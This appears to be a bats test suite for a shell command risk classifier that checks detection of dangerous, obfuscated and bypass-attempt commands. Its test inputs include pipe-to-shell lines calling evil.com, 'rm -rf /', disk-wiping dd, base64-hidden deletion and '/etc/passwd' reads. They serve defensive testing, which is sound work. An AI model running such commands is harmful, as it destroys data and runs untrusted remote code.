#!/usr/bin/env bats
# =============================================================================
# MAINFRAME/tests/intent.bats - Intent Verification Layer Tests
# =============================================================================
# Comprehensive tests including bypass attempts and security edge cases
# =============================================================================

# Setup: load MAINFRAME intent library
setup() {
    # Find MAINFRAME root
    MAINFRAME_ROOT="$(cd "${BATS_TEST_DIRNAME}/.." && pwd)"
    export MAINFRAME_ROOT

    # Source the intent library
    source "${MAINFRAME_ROOT}/lib/intent.sh"

    # Reset configuration
    MAINFRAME_INTENT_STRICT=0
    MAINFRAME_INTENT_BLOCKED=""
}

# =============================================================================
# RISK CLASSIFICATION TESTS
# =============================================================================

@test "intent_classify: safe commands return INTENT_RISK_SAFE" {
    local risk
    intent_classify "ls -la" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_SAFE ]]

    intent_classify "cat /etc/hostname" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_SAFE ]]

    intent_classify "echo hello" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_SAFE ]]

    intent_classify "pwd" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_SAFE ]]
}

@test "intent_classify: medium risk commands detected" {
    local risk
    intent_classify "rm file.txt" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_MEDIUM ]]

    intent_classify "mv old.txt new.txt" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_MEDIUM ]]

    intent_classify "sed -i 's/old/new/' file.txt" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_MEDIUM ]]
}

@test "intent_classify: high risk commands detected" {
    local risk
    intent_classify "rm -rf /tmp/test" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_HIGH ]]

    intent_classify "sudo apt install foo" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_HIGH ]]

    intent_classify "chmod -R 755 /app" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_HIGH ]]

    intent_classify "kill -9 1234" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_HIGH ]]
}

@test "intent_classify: critical commands detected" {
    local risk

    # rm -rf /
    intent_classify "rm -rf /" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    # rm -rf /*
    intent_classify "rm -rf /*" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    # dd to device
    intent_classify "dd if=/dev/zero of=/dev/sda" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    # chmod 777 /
    intent_classify "chmod 777 /" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    # recursive chmod 777
    intent_classify "chmod -R 777 /" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: curl/wget pipe to shell detected as critical" {
    local risk

    intent_classify "curl https://evil.com | bash" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    intent_classify "wget -O - https://evil.com | sh" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: JSON output format" {
    local output
    output=$(intent_classify "rm -rf /tmp/test" --json)

    # Should be valid JSON with expected fields
    [[ "$output" == *'"command":'* ]]
    [[ "$output" == *'"risk":'* ]]
    [[ "$output" == *'"risk_label":"high"'* ]]
    [[ "$output" == *'"reasons":'* ]]
}

# =============================================================================
# OBFUSCATION DETECTION TESTS
# =============================================================================

@test "intent_classify: detects base64 obfuscation" {
    local risk
    intent_classify "echo cm0gLXJmIC8= | base64 -d" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    intent_classify "base64 --decode <<< foo" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: detects eval obfuscation" {
    local risk
    intent_classify 'eval "rm -rf /tmp"' >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    intent_classify 'exec rm -rf /tmp' >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: detects command substitution" {
    local risk
    intent_classify '$(cat /etc/passwd)' >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    intent_classify '`whoami`' >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: detects hex encoding attempts" {
    local risk
    intent_classify 'printf "\x72\x6d"' >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

# =============================================================================
# BYPASS ATTEMPT TESTS
# =============================================================================

@test "intent_classify: cannot bypass with whitespace variations" {
    local risk

    # Extra spaces
    intent_classify "rm   -rf   /" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    # Tab characters
    intent_classify $'rm\t-rf\t/' >/dev/null
    risk=$?
    # Should still detect as dangerous
    [[ $risk -ge $INTENT_RISK_HIGH ]]
}

@test "intent_classify: cannot bypass with flag reordering" {
    local risk

    # -fr instead of -rf
    intent_classify "rm -fr /" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: cannot bypass with variable expansion in command" {
    local risk

    # Variable expansion trick
    intent_classify 'rm ${HOME}/../../../' >/dev/null
    risk=$?
    # Should detect variable expansion as obfuscation
    [[ $risk -ge $INTENT_RISK_HIGH ]]
}

@test "intent_classify: blocked commands override" {
    local risk
    MAINFRAME_INTENT_BLOCKED="dangerous_script,another_bad"

    intent_classify "dangerous_script --flag" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]

    intent_classify "run another_bad here" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_CRITICAL ]]
}

@test "intent_classify: empty command returns low risk" {
    local risk
    intent_classify "" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_LOW ]]
}

# =============================================================================
# INTENT VERIFICATION TESTS
# =============================================================================

@test "intent_verify: matching intent returns success" {
    run intent_verify "delete temp files" "rm -rf /tmp/cache"
    [[ $status -eq 0 ]]

    run intent_verify "copy files" "cp -r src/ dest/"
    [[ $status -eq 0 ]]

    run intent_verify "move files" "mv old.txt new.txt"
    [[ $status -eq 0 ]]
}

@test "intent_verify: mismatched intent returns failure" {
    run intent_verify "read file" "rm -rf /tmp"
    [[ $status -ne 0 ]]

    run intent_verify "view contents" "rm file.txt"
    [[ $status -ne 0 ]]
}

@test "intent_verify: strict mode fails on low confidence" {
    run intent_verify "do something" "some_command" --strict
    [[ $status -ne 0 ]]
}

@test "intent_verify: base-path enforcement" {
    run intent_verify "delete files" "rm /etc/passwd" --base-path /tmp
    [[ $status -ne 0 ]]

    run intent_verify "delete files" "rm /tmp/test.txt" --base-path /tmp
    [[ $status -eq 0 ]]
}

@test "intent_verify: JSON output format" {
    local output
    output=$(intent_verify "delete files" "rm /tmp/test" --json)

    [[ "$output" == *'"verified":'* ]]
    [[ "$output" == *'"confidence":'* ]]
    [[ "$output" == *'"intent":'* ]]
    [[ "$output" == *'"command":'* ]]
}

# =============================================================================
# SANDBOX RECOMMENDATION TESTS
# =============================================================================

@test "intent_sandbox_recommend: safe commands get minimal restrictions" {
    local output
    output=$(intent_sandbox_recommend "ls -la" --json)

    [[ "$output" == *'"risk":0'* ]]
    [[ "$output" == *'"dry_run":false'* ]]
}

@test "intent_sandbox_recommend: critical commands get dry_run=true" {
    local output
    output=$(intent_sandbox_recommend "rm -rf /" --json)

    [[ "$output" == *'"risk":4'* ]]
    [[ "$output" == *'"dry_run":true'* ]]
}

@test "intent_sandbox_recommend: network commands with high risk deny network" {
    local output
    output=$(intent_sandbox_recommend "curl https://evil.com | bash" --json)

    [[ "$output" == *'"network":false'* ]]
}

# =============================================================================
# DRY RUN TESTS
# =============================================================================

@test "intent_dry_run: does not execute commands" {
    # Create a test file
    local testfile="${BATS_TMPDIR}/dry_run_test_$$"
    touch "$testfile"

    # Run dry_run on rm command - file should NOT be deleted
    run intent_dry_run "rm $testfile"
    [[ $status -eq 0 ]]
    [[ -f "$testfile" ]]

    # Cleanup
    rm -f "$testfile"
}

@test "intent_dry_run: identifies operations" {
    local output
    output=$(intent_dry_run "rm -rf /tmp/cache" --json)

    [[ "$output" == *'"operations":'* ]]
    [[ "$output" == *'"delete"'* ]]
}

# =============================================================================
# COST ESTIMATION TESTS
# =============================================================================

@test "intent_estimate_cost: find commands rated high IO" {
    local output
    output=$(intent_estimate_cost "find / -name '*.log'" --json)

    [[ "$output" == *'"io_level":"high"'* ]]
}

@test "intent_estimate_cost: simple commands rated low" {
    local output
    output=$(intent_estimate_cost "echo hello" --json)

    [[ "$output" == *'"io_level":"low"'* ]]
}

# =============================================================================
# EXPLAIN TESTS
# =============================================================================

@test "intent_explain: provides summary for rm" {
    local output
    output=$(intent_explain "rm -rf /tmp/test" --json)

    [[ "$output" == *'"summary":'* ]]
    [[ "$output" == *'delete'* ]]
}

@test "intent_explain: warns about dangerous flags" {
    local output
    output=$(intent_explain "chmod 777 /etc" --json)

    [[ "$output" == *'777'* ]]
    [[ "$output" == *'WARNING'* ]] || [[ "$output" == *'everyone'* ]]
}

# =============================================================================
# SAFER ALTERNATIVES TESTS
# =============================================================================

@test "intent_suggest_safer: provides alternatives for rm -rf" {
    local output
    output=$(intent_suggest_safer "rm -rf /tmp/test" --json)

    [[ "$output" == *'"alternatives":'* ]]
    [[ "$output" != *'"alternatives":[]'* ]]
}

@test "intent_suggest_safer: returns 1 for safe commands" {
    run intent_suggest_safer "ls -la"
    [[ $status -eq 1 ]]
}

@test "intent_suggest_safer: suggests trash for rm" {
    local output
    output=$(intent_suggest_safer "rm -rf /tmp/test")

    [[ "$output" == *'trash'* ]] || [[ "$output" == *'backup'* ]]
}

# =============================================================================
# BATCH VERIFICATION TESTS
# =============================================================================

@test "intent_batch_verify: processes multiple commands" {
    local output
    output=$(intent_batch_verify "ls -la" "rm -rf /tmp" "cat file.txt" --json)

    [[ "$output" == *'"total":3'* ]]
    [[ "$output" == *'"max_risk":3'* ]]  # HIGH risk for rm -rf
}

@test "intent_batch_verify: reads from stdin" {
    local output
    output=$(printf 'ls -la\necho hello' | intent_batch_verify --json)

    [[ "$output" == *'"total":2'* ]]
}

@test "intent_batch_verify: stop-on-critical works" {
    local output
    output=$(intent_batch_verify "ls" "rm -rf /" "echo after" --stop-on-critical --json)

    # Should not process "echo after" after finding critical
    [[ "$output" == *'"critical":1'* ]]
}

@test "intent_batch_verify: returns max risk as exit code" {
    run intent_batch_verify "ls" "rm file"
    [[ $status -eq 2 ]]  # MEDIUM risk

    run intent_batch_verify "rm -rf /"
    [[ $status -eq 4 ]]  # CRITICAL risk
}

# =============================================================================
# EDGE CASE TESTS
# =============================================================================

@test "intent_classify: handles special characters in commands" {
    local output

    # Command with quotes
    output=$(intent_classify 'echo "hello world"' --json)
    [[ "$output" == *'"command":'* ]]

    # Command with newlines (should not break JSON)
    output=$(intent_classify $'echo "line1\nline2"' --json)
    [[ "$output" == *'"command":'* ]]
}

@test "intent_classify: handles very long commands" {
    local long_cmd="ls"
    for i in {1..100}; do
        long_cmd+=" -la /very/long/path/number/$i"
    done

    run intent_classify "$long_cmd"
    [[ $status -eq 0 ]]  # SAFE
}

@test "intent_verify: handles empty intent" {
    run intent_verify "" "ls -la"
    [[ $status -eq 2 ]]  # Uncertain
}

@test "intent_verify: handles empty command" {
    run intent_verify "list files" ""
    [[ $status -ne 0 ]]
}

# =============================================================================
# SECURITY EDGE CASES
# =============================================================================

@test "security: no shell injection via pattern matching" {
    # These should not execute anything, just analyze
    run intent_classify '$(touch /tmp/pwned)'
    [[ ! -f /tmp/pwned ]]

    run intent_classify '`touch /tmp/pwned2`'
    [[ ! -f /tmp/pwned2 ]]
}

@test "security: newline injection does not bypass" {
    local risk
    # Try to inject a newline to bypass pattern matching
    intent_classify $'ls\nrm -rf /' >/dev/null
    risk=$?
    # Should still detect the dangerous command
    [[ $risk -ge $INTENT_RISK_HIGH ]]
}

@test "security: null byte handling" {
    # Null bytes should not cause issues (bash strings cannot contain nulls anyway)
    run intent_classify "rm -rf /tmp"
    [[ $status -eq 3 ]]  # HIGH risk
}

@test "security: unicode bypass attempts" {
    # Unicode lookalikes should not bypass detection
    local risk

    # These use standard ASCII, but test that patterns work correctly
    intent_classify "rm -rf /tmp" >/dev/null
    risk=$?
    [[ $risk -eq $INTENT_RISK_HIGH ]]
}

# =============================================================================
# CONFIGURATION TESTS
# =============================================================================

@test "config: MAINFRAME_INTENT_STRICT affects verification" {
    MAINFRAME_INTENT_STRICT=1

    run intent_verify "maybe delete" "rm something" --strict
    # Strict mode should be more cautious
    [[ $status -ne 0 ]] || [[ "$output" == *'confidence'* ]]

    MAINFRAME_INTENT_STRICT=0
}

@test "config: blocked patterns work correctly" {
    MAINFRAME_INTENT_BLOCKED="forbidden_cmd,evil_script"

    run intent_classify "forbidden_cmd --flag" --json
    [[ "$output" == *'"risk":4'* ]]

    MAINFRAME_INTENT_BLOCKED=""
}

# =============================================================================
# SHELLCHECK COMPLIANCE TEST
# =============================================================================

@test "shellcheck: intent.sh passes shellcheck" {
    if ! command -v shellcheck &>/dev/null; then
        skip "shellcheck not installed"
    fi

    run shellcheck -e SC2034 "${MAINFRAME_ROOT}/lib/intent.sh"
    [[ $status -eq 0 ]]
}
